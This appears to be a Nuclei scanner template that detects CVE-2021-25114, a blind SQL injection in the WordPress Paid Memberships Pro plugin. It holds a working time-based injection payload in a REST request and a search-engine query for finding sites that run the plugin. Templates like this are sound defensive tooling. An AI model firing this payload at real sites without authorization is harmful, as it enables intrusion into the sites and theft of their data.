id: CVE-2021-25114
info:
  name: WordPress Paid Memberships Pro <2.6.7 - Blind SQL Injection
  author: theamanrawat
  severity: critical
  description: The vulnerability CVE-2021-25114 allows attackers to perform blind
    SQL injection on WordPress Paid Memberships Pro <2.6.7 plugin, potentially compromising
    sensitive information and unauthorized administrative operations.
  reference:
  - https://wpscan.com/vulnerability/6c25a5f0-a137-4ea5-9422-8ae393d7b76b
  - https://wordpress.org/plugins/paid-memberships-pro/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-25114
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-25114
    cwe-id: CWE-89
  metadata:
    google-query: inurl:"/wp-content/plugins/paid-memberships-pro"
    verified: 'true'
    impact: This vulnerability in WordPress Paid Memberships Pro plugin can lead to
      serious impact including data theft and unauthorized administrative operations.
    recommendation: To prevent potential attacks and secure your website, it is recommended
      to update the WordPress Paid Memberships Pro plugin to version 2.6.7 or newer.
  tags: wp-plugin,wp,sqli,paid-memberships-pro,wpscan,cve,cve2021,wordpress
requests:
- raw:
  - '@timeout: 15s

    GET /?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /wp-content/plugins/paid-memberships-pro/js/pmpro-checkout.js HTTP/1.1

    Host: {{Hostname}}

    '
  matchers:
  - type: dsl
    dsl:
    - duration_1>=6
    - contains(all_headers_1, "application/json")
    - status_code == 200
    - contains(body_2, 'other_discount_code_')
    condition: and
